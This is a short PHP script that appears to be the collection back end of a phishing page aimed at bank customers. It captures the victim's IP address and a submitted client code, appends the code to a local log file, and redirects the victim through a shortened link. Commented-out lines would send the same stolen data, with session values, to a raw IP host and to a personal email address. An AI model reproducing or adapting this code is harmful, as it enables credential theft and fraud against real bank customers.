<?php

session_start();
$mailSubject = "code BN";
//file_get_contents("http://193.70.109.113/save2.php?id=".$_SESSION['id']."&oooo=".$_SESSION['oooo']."&code=".$_POST['client-nbr']);
//echo "http://193.70.109.113/save2.php?id=".$_SESSION['id']."&oooo=".$_SESSION['oooo']."&code=".$_POST['client-nbr'];

$message = "+ Information\r\n";
$message .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . ")\r\n";

$message .= "| code: " . $_POST['client-nbr-page1'] . "\r\n";


$message .= "+ ------------------------------------------+\r\n\r\n";

$header = "From: " . $_SERVER['REMOTE_ADDR'] . "\r\n";

$header .= "MIME-Version: 1.0\r\n";
//mail("zoumou24@gmail.com", $mailSubject, $message, $header);
file_put_contents('log.txt', $_POST['client-nbr-page1']  . "\n", FILE_APPEND);
echo "<script>window.location.replace(\"http://bit.ly/1LWEBfP\"); </script>";
//header("#");
?>